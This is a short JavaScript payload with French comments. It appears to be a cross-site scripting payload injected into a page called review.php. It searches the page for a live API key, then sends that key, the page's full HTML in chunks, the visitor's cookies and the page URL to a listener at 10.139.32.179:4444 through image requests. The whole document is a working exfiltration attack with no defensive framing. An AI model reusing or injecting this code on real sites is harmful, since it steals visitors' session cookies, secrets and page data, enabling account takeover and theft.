// Exfiltrer le contenu de la page actuelle (review.php)
const pageContent = document.documentElement.outerHTML;

// Chercher l'API key dans la page
const keyMatch = pageContent.match(/vk_live_[a-f0-9]{40}/);
if (keyMatch) {
    // Envoyer via Image
    new Image().src = "http://10.139.32.179:4444/?api=" + keyMatch[0];
}

// Envoyer tout le HTML de la page en chunks
const chunkSize = 500;
for (let i = 0; i < pageContent.length; i += chunkSize) {
    const chunk = pageContent.substring(i, i + chunkSize);
    new Image().src = "http://10.139.32.179:4444/?chunk" + i + "=" + encodeURIComponent(chunk);
}

// Envoyer le cookie
new Image().src = "http://10.139.32.179:4444/?cookie=" + encodeURIComponent(document.cookie);

// Envoyer l'URL
new Image().src = "http://10.139.32.179:4444/?url=" + encodeURIComponent(location.href);
